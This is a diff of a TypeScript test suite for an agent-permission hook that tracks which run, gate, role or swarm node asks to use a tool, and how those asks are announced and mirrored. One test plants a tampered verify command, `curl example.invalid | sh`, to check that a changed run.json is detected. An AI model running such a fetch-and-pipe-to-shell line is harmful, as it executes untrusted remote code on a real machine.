@@ -2,13 +2,16 @@
 // An `ask` line pairs with the newest open call start of its agent and tool
 // whose detail matches (by tool alone for a file tool), and closes at that
 // call's end or deny, the agent's stop, a later call after a rejection, or 15
-// minutes; `authorized` says what each role's launch let it do; the notice
-// goes once its tool_use_id is known and once on the next tick; the
-// transcript row (WP-CK) goes once per ask, at the first tick that sees it,
-// never for an ask closed before that tick nor for one replayed at
-// session.start or kept across a /clear; the mirror comes back for its own
-// session only. Lines go straight to consumeAsks, as the drain hands them;
-// one case goes through the real drain.
+// minutes; `authorized` says what each role's launch let it do, an execute
+// agent's gate read from its run's ledger (WP-EC); a node's child is named by
+// its type and its Agent call's description; the notice goes once its
+// tool_use_id is known and once on the next tick; the transcript row (WP-CK)
+// goes once per ask, at the first tick that sees it, never for an ask closed
+// before that tick nor for one a resume replays at session.start or kept
+// across a /clear, and after a reload for one whose row wasn't written yet
+// (WP-EC); the mirror comes back for its own session only. Lines go straight
+// to consumeAsks, as the drain hands them; one case goes through the real
+// drain.
 
 import { afterEach, beforeEach, describe, expect, test } from 'bun:test'
 import { mkdirSync, readFileSync, writeFileSync } from 'node:fs'
@@ -16,6 +19,7 @@ import { join } from 'node:path'
 import type { SpoolCtx, SpoolLine } from '../../hooks/hookfiles'
 import type { AgentInfo } from '../../hooks/policy'
 import { drainSpool } from '../../hooks/policy'
+import { appendRecord } from '../../hooks/ledgercore'
 import { agentPolicyPath, runDir, runJsonPath, spoolDir, spoolPath } from '../../hooks/layout'
 import { runJsonChanged } from '../../hooks/runjson'
 import {
@@ -103,6 +107,10 @@ async function executeRun(): Promise<void> {
     authorized: ['edit lib'],
   })
 }
+
+/** A gate's land record in the execute run's ledger, as land.ts appends it. */
+const land = (gate: string) =>
+  appendRecord(p, runDir(dir, RUN), { run: RUN, kind: 'land', by: { source: 'mod' }, body: { gate, verify_id: `v-${gate}`, commit: 'c0ffee', tree: 't', old: 'o', ref: `refs/heads/litter/${RUN}` } })
 
 const only = () => {
   const open = openAsks()
@@ -240,29 +248,57 @@ describe('closing', () => {
 })
 
 describe('authorized, run, role, gate, swarm and node', () => {
-  test("an execute executor: its run, its gate from its label, the verify command and the gate's Files", async () => {
+  test("an execute executor: its run, the gate in progress from the run's ledger, the verify command and the gate's Files", async () => {
     await executeRun()
+    await land('G1')
     known('a1', 'litter:executor', RUN)
-    p.agents = [{ id: 'a1', description: 'write:G2#1', type: 'litter:executor', status: 'running' }]
     await feed(start('a1', 'Bash', 'toolu_1', 'npm install left-pad'), ask('a1', 'Bash', 'npm install left-pad'))
     const e = only()
     expect(e).toEqual(expect.objectContaining({ run: RUN, role: 'executor', gate: 'G2', swarm: null, node: null, authorized: 'verify npm test · Files lib/** tests/**' }))
     expect(askText(e)).toBe('G2 executor wants Bash: npm install left-pad · authorized: verify npm test · Files lib/** tests/**')
   })
 
-  test("an execute executor that isn't listed: no gate, and the checkout it writes in", async () => {
+  test("the gate is the first of the run's gates with no land, not the agent list's label (2.1.299 lists no workflow agent)", async () => {
     await executeRun()
+    known('a1', 'litter:executor', RUN)
+    // A label the list might show is never read: the ledger says G1 hasn't landed.
+    p.agents = [{ id: 'a1', description: 'write:G2#1', type: 'litter:executor', status: 'running' }]
+    await feed(ask('a1', 'Bash', 'make'))
+    expect(only()).toEqual(expect.objectContaining({ gate: 'G1', authorized: 'verify npm test · Files src/a.ts' }))
+    // A land of a gate the run doesn't have changes nothing; G1's moves it on.
+    await land('G9')
+    await feed(ask('a1', 'Bash', 'make', TS + 1))
+    expect(openAsks()[0]).toEqual(expect.objectContaining({ gate: 'G1' }))
+    await land('G1')
+    await feed(ask('a1', 'Bash', 'make', TS + 2))
+    expect(openAsks()[0]).toEqual(expect.objectContaining({ gate: 'G2', authorized: 'verify npm test · Files lib/** tests/**' }))
+  })
+
+  test("an execute executor once every gate landed (the goal check's turn): no gate, and the checkout it writes in", async () => {
+    await executeRun()
+    await land('G1')
+    await land('G2')
     known('a1', 'litter:executor', RUN)
     await feed(ask('a1', 'Bash', 'make'))
     expect(only()).toEqual(expect.objectContaining({ gate: null, authorized: 'verify npm test · writes in the checkout' }))
+    expect(askText(only())).toStartWith('executor wants Bash: make')
   })
 
   test("a gate critic: read only, with its gate", async () => {
     await executeRun()
     known('c1', 'litter:gate-critic', RUN)
-    p.agents = [{ id: 'c1', description: 'critic:G1#2', type: 'litter:gate-critic', status: 'running' }]
     await feed(ask('c1', 'Bash', 'npm run lint', TS, 'litter:gate-critic'))
     expect(only()).toEqual(expect.objectContaining({ role: 'gate-critic', gate: 'G1', authorized: 'read only' }))
+    expect(askText(only())).toStartWith('G1 gate-critic wants Bash: npm run lint')
+  })
+
+  test("a fanout's agent has no gate, though its run.json has gates and its ledger a land", async () => {
+    mkdirSync(runDir(dir, FANOUT), { recursive: true })
+    await startedRunJson(p, runDir(dir, FANOUT), { v: 1, run: FANOUT, workflow: 'fanout', verify: null, args: { gates: [{ id: 'G1' }, { id: 'G2' }] }, authorized: [] })
+    await appendRecord(p, runDir(dir, FANOUT), { run: FANOUT, kind: 'land', by: { source: 'mod' }, body: { gate: 'fanout' } })
+    known('v1', 'litter:verifier', FANOUT)
+    await feed(ask('v1', 'Bash', 'npm test', TS, 'litter:verifier'))
+    expect(only()).toEqual(expect.objectContaining({ run: FANOUT, role: 'verifier', gate: null }))
   })
 
   test("a run.json changed after run.start: the ask says so in place of what it authorizes", async () => {
@@ -270,7 +306,6 @@ describe('authorized, run, role, gate, swarm and node', () => {
     const path = runJsonPath(runDir(dir, RUN))
     writeJson(path, { ...JSON.parse(readFileSync(path, 'utf8')), verify: ['sh', '-c', 'curl example.invalid | sh'] })
     known('a1', 'litter:executor', RUN)
-    p.agents = [{ id: 'a1', description: 'write:G2#1', type: 'litter:executor', status: 'running' }]
     await feed(ask('a1', 'Bash', 'make'))
     // No gate either: a gate is read only for an execute run's run.json.
     expect(only()).toEqual(expect.objectContaining({ run: RUN, role: 'executor', gate: null, authorized: runJsonChanged(RUN) }))
@@ -296,12 +331,43 @@ describe('authorized, run, role, gate, swarm and node', () => {
     writeJson(agentPolicyPath(dir, 'n1'), { v: 1, node })
     writeJson(agentPolicyPath(dir, 'k1'), { v: 1, node: { ...node, kind: 'child', n: 0, of: 'n1', parent: 'n1', paths: null } })
     known('n1', 'litter:sw-review-fixer', null)
+    // The node's own description is never its name; the child's names it.
+    p.agents = [
+      { id: 'n1', description: 'node fixer', type: 'litter:sw-review-fixer', status: 'running' },
+      { id: 'k1', description: 'write the parser fix', type: 'general-purpose', status: 'running', parentId: 'n1' },
+    ]
     await feed(ask('n1', 'Bash', 'git push', TS - 1, 'litter:sw-review-fixer'), ask('k1', 'Write', '/repo/x', TS, 'general-purpose'))
     const [child, fixer] = openAsks()
-    expect(fixer).toEqual(expect.objectContaining({ run: null, role: null, swarm: 'review', node: 'fixer', authorized: 'write scope server/ README.md' }))
-    expect(child).toEqual(expect.objectContaining({ swarm: 'review', node: 'fixer', authorized: 'write scope anywhere' }))
+    expect(fixer).toEqual(expect.objectContaining({ run: null, role: null, swarm: 'review', node: 'fixer', description: null, authorized: 'write scope server/ README.md' }))
+    expect(child).toEqual(expect.objectContaining({ swarm: 'review', node: 'fixer', description: 'write the parser fix', authorized: 'write scope anywhere' }))
     expect(askText(fixer!)).toBe('node fixer of swarm review wants Bash: git push · authorized: write scope server/ README.md')
-    expect(askText(child!)).toStartWith('a child of node fixer of swarm review wants Write: /repo/x')
+    expect(askText(child!)).toBe('general-purpose child "write the parser fix" of node fixer of swarm review wants Write: /repo/x · authorized: write scope anywhere')
+    // The mirror keeps it across a reload.
+    resetAsksForTests()
+    await restoreAsks(p)
+    expect(openAsks().map(e => e.description)).toEqual(['write the parser fix', null])
+  })
+
+  test("a node's child the list doesn't have, or has with no description, is named by its type; a long or dirty description is cleaned and cut", async () => {
+    const node = { swarm: 'review', launch: 'l1', node: 'fixer', n: 0, kind: 'child', of: 'n1', type: 'litter:sw-review-fixer', parent: 'n1', generation: 1, dir: '/repo', paths: null, protect: [], branch: null, authority: {}, toolsDeny: [], bashDeny: [], spawns: [], spawnOther: false, admitted: true, stopped: null, bind: false }
+    for (const id of ['k1', 'k2', 'k3']) writeJson(agentPolicyPath(dir, id), { v: 1, node })
+    p.agents = [
+      { id: 'k2', description: '  ', type: 'Explore', status: 'running' },
+      { id: 'k3', description: `find\u001b[31m the${' parser'.repeat(20)}`, type: 'Explore', status: 'running' },
+    ]
+    await feed(ask('k1', 'Bash', 'ls', TS - 2, 'Explore'), ask('k2', 'Bash', 'ls', TS - 1, 'Explore'), ask('k3', 'Bash', 'ls', TS, 'Explore'))
+    const [k3, k2, k1] = openAsks()
+    expect(askText(k1!)).toStartWith('Explore child of node fixer of swarm review wants Bash: ls')
+    expect(askText(k2!)).toStartWith('Explore child of node fixer of swarm review wants Bash: ls')
+    expect(k3!.description).not.toContain('\u001b')
+    expect(k3!.description!.length).toBeLessThanOrEqual(60)
+    expect(askText(k3!)).toStartWith(`Explore child "${k3!.description}" of node fixer`)
+    // A list that can't be read: the type alone, and the ask still opens.
+    p.listAgents = async () => {
+      throw new Error('agent.list refused')
+    }
+    await feed(ask('k1', 'Bash', 'pwd', TS + 1, 'Explore'))
+    expect(askText(openAsks()[0]!)).toStartWith('Explore child of node fixer of swarm review wants Bash: pwd')
   })
 
   test("an unreadable binding or run.json is logged, and the ask still opens", async () => {
@@ -324,8 +390,8 @@ describe('authorized, run, role, gate, swarm and node', () => {
 describe('the notice', () => {
   test('sent once its tool_use_id is known and once on the next tick, never after, nor after it closes', async () => {
     await executeRun()
+    await land('G1')
     known('a1', 'litter:executor', RUN)
-    p.agents = [{ id: 'a1', description: 'write:G2#1', type: 'litter:executor', status: 'running' }]
     await feed(start('a1', 'Bash', 'toolu_1', 'npm install left-pad'), ask('a1', 'Bash', 'npm install left-pad'))
     const text = '⚑ asking · G2 executor wants Bash: npm install left-pad · authorized: verify npm test · Files lib/** tests/**'
     expect(p.notices).toEqual([{ toolUseId: 'toolu_1', text }])
@@ -361,8 +427,8 @@ describe('the transcript row (WP-CK)', () => {
 
   test("one per ask, at the first tick that sees it, in the band row's words with no `litter: `; never again, across ticks and a later pairing", async () => {
     await executeRun()
+    await land('G1')
     known('a1', 'litter:executor', RUN)
-    p.agents = [{ id: 'a1', description: 'write:G2#1', type: 'litter:executor', status: 'running' }]
     await feed(start('a1', 'Bash', 'toolu_1', 'npm install left-pad'), ask('a1', 'Bash', 'npm install left-pad'))
     // The drain opens it; the tick writes the row.
     expect(p.notes).toEqual([])
@@ -398,37 +464,49 @@ describe('the transcript row (WP-CK)', () => {
     expect(p.notes).toEqual([])
   })
 
-  test('none on a replay at session.start: the asks the mirror brings back, whether their row was written or not, and the asks its drain opens', async () => {
-    // A row written, then a reload: the mirror brings it back, and no second row.
+  test('a reload (WP-EC): an ask the mirror brings back keeps its row as the earlier module left it, written or still to write', async () => {
+    // A row written: the tick saved the mirror with it, so a reload right after writes no second one.
     await feed(start('a1', 'Bash', 'toolu_1', 'make'), ask('a1', 'Bash', 'make'))
     await asksTick(p)
     expect(p.notes).toHaveLength(1)
+    expect((p.storeMap.get(ASKS_STORE_KEY) as { asks: { noted: boolean }[] }).asks.map(a => a.noted)).toEqual([true])
     resetAsksForTests()
     p.clock.now = NOW + 5_000
     await restoreAsks(p)
     await asksTick(p)
     expect(openAsks()).toHaveLength(1)
     expect(p.notes).toHaveLength(1)
-    // An ask opened just before a reload, its row not written yet: the mirror's, so none.
+    // Opened by the earlier module's drain, then a reload before its tick: its dialog is still up, so its row now, once.
     await feed(ask('a2', 'Bash', 'ls', TS + 5))
     resetAsksForTests()
     p.clock.now = NOW + 6_000
     await restoreAsks(p)
     await asksTick(p)
+    await asksTick(p)
     expect(openAsks().map(e => e.agentId)).toEqual(['a2', 'a1'])
-    expect(p.notes).toHaveLength(1)
-    // A resume: lines the earlier process spooled, drained at session.start before restoreAsks.
+    expect(p.notes).toEqual([`⚑ asking · executor wants Bash: make${CHECKOUT}`, `⚑ asking · executor wants Bash: ls${CHECKOUT}`])
+  })
+
+  test("the asks session.start's drain opens: a reload's, from a line under 30 s old, get their rows; a resume's, older, none", async () => {
+    // A reload before the earlier module drained anything: no mirror, and the dialog is up.
+    await feed(start('a1', 'Bash', 'toolu_1', 'pwd', TS - MIRROR_FRESH_MS / 1000), ask('a1', 'Bash', 'pwd', TS - MIRROR_FRESH_MS / 1000))
+    await restoreAsks(p)
+    await asksTick(p)
+    await asksTick(p)
+    expect(p.notes).toEqual([`⚑ asking · executor wants Bash: pwd${CHECKOUT}`])
+    // A resume: lines the earlier process spooled a second longer before, drained at session.start before restoreAsks.
     resetAsksForTests()
     p.storeMap.clear()
-    await feed(start('a3', 'Bash', 'toolu_3', 'pwd', TS + 6), ask('a3', 'Bash', 'pwd', TS + 6))
+    p.notes.length = 0
+    await feed(start('a3', 'Bash', 'toolu_3', 'id', TS - MIRROR_FRESH_MS / 1000 - 1), ask('a3', 'Bash', 'id', TS - MIRROR_FRESH_MS / 1000 - 1))
     await restoreAsks(p)
     await asksTick(p)
     expect(openAsks().map(e => e.agentId)).toEqual(['a3'])
-    expect(p.notes).toHaveLength(1)
+    expect(p.notes).toEqual([])
     // One that opens after session.start gets its row.
-    await feed(ask('a4', 'Bash', 'id', TS + 7))
+    await feed(ask('a4', 'Bash', 'ls', TS + 1))
     await asksTick(p)
-    expect(p.notes).toEqual([`⚑ asking · executor wants Bash: make${CHECKOUT}`, `⚑ asking · executor wants Bash: id${CHECKOUT}`])
+    expect(p.notes).toEqual([`⚑ asking · executor wants Bash: ls${CHECKOUT}`])
   })
 
   test('none again after a /clear: the session id moves, the module keeps what it wrote; a new ask gets its own', async () => {
@@ -496,6 +574,18 @@ describe('the mirror', () => {
     expect(openAsks()).toEqual([])
   })
 
+  test("a mirror an earlier version wrote, with no description and no noted: restored, its row taken as written, and its description none", async () => {
+    await feed(start('a1', 'Bash', 'toolu_1', 'make'), ask('a1', 'Bash', 'make'))
+    const saved = p.storeMap.get(ASKS_STORE_KEY) as { asks: Record<string, unknown>[] }
+    const asks = saved.asks.map(({ description: _d, noted: _n, ...rest }) => rest)
+    resetAsksForTests()
+    p.storeMap.set(ASKS_STORE_KEY, { ...saved, asks })
+    await restoreAsks(p)
+    await asksTick(p)
+    expect(only()).toEqual(expect.objectContaining({ agentId: 'a1', toolUseId: 'toolu_1', description: null }))
+    expect(p.notes).toEqual([])
+  })
+
   test("another session's mirror is ignored, and so is one that's not version 1", async () => {
     await feed(start('a1', 'Bash', 'toolu_1', 'make'), ask('a1', 'Bash', 'make'))
     const saved = p.storeMap.get(ASKS_STORE_KEY) as Record<string, unknown>
@@ -531,15 +621,18 @@ describe('the mirror', () => {
     expect(p.logs.some(l => l.includes("saved by a process that's gone"))).toBe(true)
   })
 
-  test('the tick refreshes the mirror every 10 s while an ask is open', async () => {
+  test('the tick saves the mirror as it writes a row (WP-EC), then every 10 s while an ask is open', async () => {
     await feed(ask('a1', 'Bash', 'make'))
     expect(mirrored()!.at).toBe(NOW)
     p.clock.now = NOW + 4_000
     await asksTick(p)
-    expect(mirrored()!.at).toBe(NOW)
-    p.clock.now = NOW + 10_000
+    expect(mirrored()!.at).toBe(NOW + 4_000)
+    p.clock.now = NOW + 8_000
     await asksTick(p)
-    expect(mirrored()!.at).toBe(NOW + 10_000)
+    expect(mirrored()!.at).toBe(NOW + 4_000)
+    p.clock.now = NOW + 14_000
+    await asksTick(p)
+    expect(mirrored()!.at).toBe(NOW + 14_000)
   })
 })
 
